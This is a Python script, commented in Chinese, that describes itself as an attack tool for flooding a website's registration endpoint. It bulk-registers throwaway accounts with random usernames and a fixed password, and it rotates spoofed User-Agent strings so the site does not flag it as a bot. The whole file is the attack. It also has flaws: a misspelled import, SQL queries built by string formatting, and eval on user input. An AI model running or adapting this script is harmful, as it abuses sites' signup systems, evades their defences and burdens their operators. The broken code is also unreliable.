import reuests				# 用于发送网络请求 (发送请求以实现注册功能)
import sqlite3          # 用于连接数据库 (储存生成过的用户名以不重复生成)
import random           # 随机选择字符或数字 (用于生成用户名)
import time             # 用于计时 (计数攻击所用的时间)


""" 定义必要变量 """

# 数字和字母 (用于生成用户名)
words = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
         'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',
         'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
         'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',
         'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
         'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
         'y', 'z']

# 代理池 (防止网站识别为爬虫)
user_agents = [
		'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60',
		'Opera/8.0 (Windows NT 5.1; U; en)',
		'Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50',
		'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50',
		'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0',
		'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10',
		'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2 ',
		'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36',
		'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
		'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16',
		'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36',
		'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
		'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11',
		'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER',
		'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)',
		'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0',
		'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0) ',
	]

# 要攻击的网址 (请参阅 README.txt )
url = ' $url '

""" 变量定义完毕 """


""" 定义必要函数 """

def get_user_name(length: int) -> str:
    """
    函数用途: 生成用户名并返回
	(生成后检查数据库中是否已经储存过该用户名(即是否已经生成过该用户名), 是则重新生成, 否则将当前生成的用户名储存到数据库后返回)
    length: 要生成的用户名长度
	@return : 生成的未被生成过的用户名
    """
    conn = sqlite3.connect('data.db')                           # 连接到数据库
    cursor = conn.cursor()                                      # 用于执行命令 (例如查找、添加用户名)

    # 使用循环以保证用户名已经存在时可以重新生成
    while True:                             
        name: str = ''                                          # 用户名

        # 生成用户名
        for _ in range(length):                                 # 遍历 length 次
            name += random.choice(words)                        # 随机抽取字符后添加到 name 

        # 判断用户名是否存在
        s = """SELECT name FROM names WHERE name = '%s' """ % name
        cursor.execute(s)
        result = cursor.fetchall()								# 查找结果

        # 当用户名不存在
        if not result:
            s2 = """INSERT INTO names VALUES ('%s')""" % name   # 存入数据 (的语句)
            cursor.execute(s2)                                  # 执行 s2 语句
            conn.commit()                                       # 保存
            break                                               # 跳出循环

        # 当用户名已经存在
        else:
            continue                                            # 重新生成用户名 (重新进行循环)

    # 执行到这一步时已经生成了未被生成过的用户名并保存在了数据库中 (用户名的值已经赋给变量 name )
    # 此时关闭 cursor 和 conn, 并且返回 name 即可
    cursor.close()
    conn.close()

    # 返回
    return name

def attack(times: int) -> None:
    """
    函数用途: 攻击网站
    times: 攻击的次数
    """
    for i in range(times):
        # default = 7                                           # 默认用户名长度 (未实现该功能)
        time_o = time.time()                                    # 攻击之前时间 (用于计数攻击所用的时间)
        name = get_user_name(7)                                 # 得到用户名
        headers = {'User-Agent': random.choice(user_agents)}    # 请求头 (用户代理)
        data = {'user_name': '%s' % name,						# 请求数据
                'user_pwd': '1234567',
                'user_pwd2': '1234567'
                }
        result = requests.post(headers=headers, data=data, url=url)		# 请求结果
        text = result.text										# 请求结果的文本信息
        time_n = time.time()                                    # 攻击之后时间 (用于计数攻击所用的时间)

        print("第%d次攻击" % (i + 1))

        # 是否注册成功
        if text.strip() == '{"code":1,"msg":"注册成功，登录成功"}':
            print("攻击成功!")
        else:
            print("攻击失败!")
            print("%s" % text)

        print("用户名: %s\n密码: 1234567" % name)
        print("所用时间: %f" % (time_n - time_o))
        print("\n")
	
""" 函数定义完毕 """

""" 声明程序入口 """

if __name__ == '__main__':
    num = eval(input("请输入攻击的次数: "))
    attack(num)
